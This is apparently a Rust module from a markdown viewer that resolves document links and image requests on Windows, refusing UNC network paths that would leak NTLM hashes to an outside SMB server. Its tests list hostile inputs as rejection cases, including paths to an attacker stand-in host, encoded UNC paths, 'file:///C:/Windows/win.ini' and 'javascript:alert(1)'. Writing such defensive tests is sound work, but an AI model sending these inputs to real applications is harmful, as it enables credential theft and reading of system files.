//! 문서 안의 상대 링크가 가리키는 파일.
//!
//! 마크다운은 출처를 모르는 입력이다. 링크를 누르면 메인이 그 경로를 연다(stat → read).
//! ★ 그 경로가 **네트워크 경로(UNC)** 가 되면 열기만 해도 윈도우가 그 서버에 SMB 인증을 보낸다(NTLM 해시 유출).
//!   `[x](//evil.example/share/a.md)` 가 경로로 풀리면 `\\evil.example\share\a.md` 가 된다.
//!   그래서 **풀기 전에 글자 꼴을 거르고**, 푼 뒤에도 같은 공유 밖이면 거절한다.
//!
//! 여기서는 `PathBuf::push` 에 날것의 조각을 넣지 않는다 —
//! 윈도우에서 `push("C:foo")` 는 앞 경로를 통째로 바꿔 버리기 때문이다. 조각에 `:` 가 있으면 아예 거절한다.

use std::path::{Component, Path, PathBuf};

use crate::text::{has_ext, IMAGE_EXTENSIONS};

/// 스킴(`http:` · `file:` · `C:` …)으로 시작하는가.
fn has_scheme(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() => {}
        _ => return false,
    }
    for c in chars {
        if c == ':' {
            return true;
        }
        if !(c.is_ascii_alphanumeric() || c == '+' || c == '.' || c == '-') {
            return false;
        }
    }
    false
}

/// decodeURIComponent 와 같다: 잘못된 `%xx` 나 UTF-8 이 아니면 None.
fn percent_decode_strict(s: &str) -> Option<String> {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' {
            let hi = b.get(i + 1).and_then(|c| (*c as char).to_digit(16))?;
            let lo = b.get(i + 2).and_then(|c| (*c as char).to_digit(16))?;
            out.push((hi * 16 + lo) as u8);
            i += 3;
        } else {
            out.push(b[i]);
            i += 1;
        }
    }
    String::from_utf8(out).ok()
}

/// UNC 의 서버·공유 부분(대소문자 무시). UNC 가 아니면 None.
/// `\\?\UNC\server\share` 는 `\\server\share` 와 같은 값이 된다(같은 공유를 두 꼴로 쓰는 것을 가른다).
pub fn unc_root(p: &Path) -> Option<String> {
    match p.components().next() {
        Some(Component::Prefix(pre)) => {
            let s = pre.as_os_str().to_string_lossy().to_lowercase();
            if let Some(rest) = s.strip_prefix("\\\\?\\unc\\") {
                return Some(format!("\\\\{rest}"));
            }
            // `\\server\share`. (`\\?\C:` · `\\.\dev` 같은 접두사도 여기서 `\\` 로 시작하는 것으로 잡힌다 — 공유처럼 다룬다.)
            if s.starts_with("\\\\") {
                Some(s)
            } else {
                None
            }
        }
        _ => None,
    }
}

/// 그림 주소(`marklet-local://f/<경로>`)가 가리키는 파일 — 내줘도 되면 경로, 아니면 None.
/// 메인의 스킴 핸들러가 부른다.
///
/// @param decoded   주소의 경로 부분을 퍼센트 해제한 것. 렌더러(local-image.ts)가 `C:/a/b.png` · `//서버/공유/a/b.png` 꼴로 보낸다.
/// @param open_docs 지금 열려 있는 문서들의 경로. **네트워크 경로일 때만** 부른다(잠금을 흔한 경우에서 뺀다).
///
///  · 그림 확장자만, 절대 경로만(상대 경로는 프로세스의 작업 폴더 기준으로 읽히게 된다), `..` 조각이 든 경로는 거절한다(렌더러가 접어서 보낸다).
///  · ★ 네트워크 경로(UNC)는 열려 있는 문서 중 하나가 **같은 서버·공유**에 있을 때만 — 그 밖의 서버를 건드리면 열기만 해도 SMB 인증이 나간다.
pub fn image_request_path(
    decoded: &str,
    open_docs: impl FnOnce() -> Vec<PathBuf>,
) -> Option<PathBuf> {
    let path = PathBuf::from(decoded.replace('/', "\\"));
    if !has_ext(&path, &IMAGE_EXTENSIONS) || !path.is_absolute() {
        return None;
    }
    if path.components().any(|c| matches!(c, Component::ParentDir)) {
        return None;
    }
    if let Some(root) = unc_root(&path) {
        let same_share = open_docs()
            .iter()
            .any(|doc| doc.parent().and_then(unc_root).as_deref() == Some(root.as_str()));
        if !same_share {
            return None;
        }
    }
    Some(path)
}

/// @param doc_dir 지금 문서가 있는 폴더(절대 경로)
/// @param href    링크의 href 그대로(상대 주소)
/// @return 열어도 되는 절대 경로. 열면 안 되는 것은 None.
pub fn resolve_doc_link(doc_dir: &Path, href: &str) -> Option<PathBuf> {
    if doc_dir.as_os_str().is_empty() {
        return None;
    }
    // 스킴이 있으면 상대 링크가 아니다.
    if has_scheme(href) {
        return None;
    }
    let cut = href.split('#').next().unwrap_or("");
    let cut = cut.split('?').next().unwrap_or("");
    let rel = percent_decode_strict(cut)?;
    if rel.is_empty() {
        return None;
    }

    // 풀기 전에: 네트워크 경로 꼴(`//host` · `\\host` · `/\host` · `\host`)은 상대 링크가 아니다.
    // (디코드한 뒤에 본다 — `%2F%2Fhost` 로 숨겨도 걸린다.)
    let mut it = rel.chars();
    let (c0, c1) = (it.next(), it.next());
    let sep = |c: Option<char>| matches!(c, Some('/') | Some('\\'));
    if (sep(c0) && sep(c1)) || c0 == Some('\\') {
        return None;
    }

    // 기준 폴더를 조각으로 나눈다(접두사 · 루트는 그대로 두고 아래로만 움직인다).
    let mut out = PathBuf::new();
    for c in doc_dir.components() {
        match c {
            Component::Prefix(p) => out.push(p.as_os_str()),
            Component::RootDir => out.push(std::path::MAIN_SEPARATOR_STR),
            Component::Normal(s) => out.push(s),
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
        }
    }

    for seg in rel.split(['/', '\\']) {
        match seg {
            "" | "." => {}
            ".." => {
                // 루트(드라이브 · 공유) 위로는 못 올라간다. pop 이 false 면 그대로 둔다.
                out.pop();
            }
            s => {
                // 드라이브 문자(`C:`) · 대체 데이터 스트림(`a.md:zone`)이 끼어들 틈을 없앤다.
                if s.contains(':') {
                    return None;
                }
                out.push(s);
            }
        }
    }

    // 푼 뒤에도: 결과가 UNC 이면, 문서 자신이 같은 서버·공유에 있을 때만 허용한다.
    let root = unc_root(&out);
    if root.is_some() && root != unc_root(doc_dir) {
        return None;
    }
    Some(out)
}

#[cfg(test)]
#[cfg(windows)]
mod tests {
    use super::*;

    fn open(dir: &str, href: &str) -> Option<String> {
        resolve_doc_link(Path::new(dir), href).map(|p| p.to_string_lossy().into_owned())
    }
    const DIR: &str = "C:\\docs\\notes";

    #[test]
    fn normal_links_resolve() {
        assert_eq!(open(DIR, "b.md").as_deref(), Some("C:\\docs\\notes\\b.md"));
        assert_eq!(
            open(DIR, "./sub/c.md").as_deref(),
            Some("C:\\docs\\notes\\sub\\c.md")
        );
        assert_eq!(open(DIR, "../top.md").as_deref(), Some("C:\\docs\\top.md"));
        assert_eq!(
            open(DIR, "sub\\c.md").as_deref(),
            Some("C:\\docs\\notes\\sub\\c.md")
        );
    }

    #[test]
    fn anchors_queries_and_percent_encoding() {
        assert_eq!(
            open(DIR, "b.md#절").as_deref(),
            Some("C:\\docs\\notes\\b.md")
        );
        assert_eq!(
            open(DIR, "b.md?x=1").as_deref(),
            Some("C:\\docs\\notes\\b.md")
        );
        assert_eq!(
            open(DIR, "%ED%95%9C%EA%B8%80.md").as_deref(),
            Some("C:\\docs\\notes\\한글.md")
        );
    }

    #[test]
    fn climbing_cannot_leave_the_root() {
        assert_eq!(open(DIR, "../../../../x.md").as_deref(), Some("C:\\x.md"));
    }

    #[test]
    fn network_paths_are_refused() {
        for href in [
            "//evil.example/share/a.md",
            "\\\\evil.example\\share\\a.md",
            "/\\evil.example/share/a.md",
            "\\/evil.example/share/a.md",
            "\\evil.example\\share\\a.md",
            "%2F%2Fevil.example/share/a.md",
            "%5C%5Cevil.example%5Cshare%5Ca.md",
        ] {
            assert_eq!(open(DIR, href), None, "{href}");
        }
    }

    #[test]
    fn schemes_drives_and_junk_are_refused() {
        for href in [
            "http://example.com/a.md",
            "file:///C:/Windows/win.ini",
            "C:\\Windows\\win.ini",
            "C:/Windows/win.ini",
            "javascript:alert(1)",
            "mailto:a@b.c",
            "",
            "#only-anchor",
            "%E0%A4%A.md",
            "sub/C:/x.md",
            "a.md:zone",
        ] {
            assert_eq!(open(DIR, href), None, "{href}");
        }
        assert!(resolve_doc_link(Path::new(""), "a.md").is_none());
    }

    #[test]
    fn a_document_on_a_share_may_link_within_that_share_only() {
        let share = "\\\\srv\\share\\docs";
        assert_eq!(
            open(share, "b.md").as_deref(),
            Some("\\\\srv\\share\\docs\\b.md")
        );
        assert_eq!(
            open(share, "../c.md").as_deref(),
            Some("\\\\srv\\share\\c.md")
        );
        assert_eq!(open(share, "//evil.example/share/a.md"), None);
        assert_eq!(open(share, "\\\\evil.example\\share\\a.md"), None);
    }

    #[test]
    fn both_spellings_of_a_share_are_the_same_root() {
        let want = Some("\\\\srv\\share".to_string());
        assert_eq!(unc_root(Path::new("\\\\srv\\share\\a")), want);
        assert_eq!(unc_root(Path::new("\\\\SRV\\Share\\a")), want);
        assert_eq!(unc_root(Path::new("\\\\?\\UNC\\Srv\\SHARE\\a")), want);
        assert_eq!(unc_root(Path::new("C:\\a")), None);
        assert_eq!(unc_root(Path::new("a\\b")), None);
    }

    /// 열린 문서 `docs` 가 있을 때 이 그림 요청(퍼센트를 푼 경로)을 내주는가 — 내주면 읽을 경로.
    fn image(decoded: &str, docs: &[&str]) -> Option<String> {
        let docs: Vec<PathBuf> = docs.iter().map(PathBuf::from).collect();
        image_request_path(decoded, || docs).map(|p| p.to_string_lossy().into_owned())
    }

    #[test]
    fn image_requests_on_a_local_drive_never_consult_the_open_documents() {
        let only = |d: &str| {
            image_request_path(d, || panic!("로컬 드라이브 요청은 열린 문서를 보지 않는다"))
                .map(|p| p.to_string_lossy().into_owned())
        };
        assert_eq!(
            only("C:/docs/img/a.png").as_deref(),
            Some("C:\\docs\\img\\a.png")
        );
        assert_eq!(
            only("D:/문서/그림/내 사진.PNG").as_deref(),
            Some("D:\\문서\\그림\\내 사진.PNG")
        );
    }

    #[test]
    fn image_requests_are_absolute_images_without_parent_segments() {
        for d in [
            "C:/docs/a.txt",
            "C:/docs/a.html",
            "C:/docs/a",
            "C:/docs/a.png:zone",
            "C:/docs/../a.png",
            "C:/docs/img/../../a.png",
            // 절대 경로가 아니면 프로세스의 작업 폴더 기준으로 읽힌다
            "a.png",
            "docs/a.png",
            "/a.png",
            "C:a.png",
            "",
        ] {
            assert_eq!(image(d, &[]), None, "{d}");
        }
    }

    #[test]
    fn image_requests_on_a_share_need_an_open_document_on_that_share() {
        let doc = "\\\\srv\\share\\docs\\a.md";
        assert_eq!(
            image("//srv/share/docs/img/a.png", &[doc]).as_deref(),
            Some("\\\\srv\\share\\docs\\img\\a.png")
        );
        // 문서 폴더 밖이어도 같은 공유 안이면 된다(`../assets/a.png`)
        assert_eq!(
            image("//srv/share/assets/a.png", &[doc]).as_deref(),
            Some("\\\\srv\\share\\assets\\a.png")
        );
        // 서버 · 공유 이름은 대소문자를 가리지 않는다
        assert_eq!(
            image("//SRV/Share/docs/a.png", &[doc]).as_deref(),
            Some("\\\\SRV\\Share\\docs\\a.png")
        );
        // 긴 경로 꼴로 열린 문서도 같은 공유다
        assert_eq!(
            image(
                "//srv/share/docs/a.png",
                &["\\\\?\\UNC\\srv\\share\\docs\\a.md"]
            )
            .as_deref(),
            Some("\\\\srv\\share\\docs\\a.png")
        );
        // 여러 문서 중 하나만 맞아도 된다
        assert!(image("//srv/share/a.png", &["C:\\x\\a.md", doc]).is_some());
    }

    #[test]
    fn image_requests_on_another_share_or_server_are_refused() {
        let doc = "\\\\srv\\share\\docs\\a.md";
        for d in [
            "//srv/other/a.png",
            "//evil/share/a.png",
            "//srv.evil/share/a.png",
            "//127.0.0.1/share/a.png",
            // 긴 경로 · 장치 경로
            "//?/C:/Windows/a.png",
            "//?/UNC/evil/share/a.png",
            "//./pipe/a.png",
            // 서버만 · 공유만 있고 파일이 없는 것
            "//srv/share",
        ] {
            assert_eq!(image(d, &[doc]), None, "{d}");
        }
        // 열린 문서가 없거나, 공유 문서가 아니면 어느 공유도 내주지 않는다
        assert_eq!(image("//srv/share/a.png", &[]), None);
        assert_eq!(image("//srv/share/a.png", &["C:\\docs\\a.md"]), None);
        // `..` 로 공유 안에서 위로 가는 것도 거절한다(렌더러는 접어서 보낸다)
        assert_eq!(image("//srv/share/docs/../a.png", &[doc]), None);
    }
}
